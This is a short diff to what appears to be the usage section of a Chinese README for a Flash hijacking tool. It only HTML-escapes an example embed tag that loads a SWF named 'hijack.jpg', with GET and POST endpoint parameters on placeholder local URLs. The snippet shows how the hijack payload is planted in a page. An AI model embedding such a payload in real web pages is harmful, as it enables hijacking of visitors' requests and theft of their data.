@@ -4,10 +4,10 @@ flash 劫持轮子
 使用：
 HTML：
 
-<div> 
-<embed src="hijack.jpg?jpg=http://127.0.0.1/1.png&get=http://127.0.0.1/l.php&post=http://127.0.0.1/2.php" width="970" height="107" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent"></embed> 
-</object> 
-</div>
+&lt;div&gt; 
+&lt;embed src=&quot;hijack.jpg?jpg=http://127.0.0.1/1.png&amp;get=http://127.0.0.1/l.php&amp;post=http://127.0.0.1/2.php&quot; width=&quot;970&quot; height=&quot;107&quot; quality=&quot;high&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; type=&quot;application/x-shockwave-flash&quot; wmode=&quot;transparent&quot;&gt;&lt;/embed&gt; 
+&lt;/object&gt; 
+&lt;/div&gt;
 
 参数说明:
 
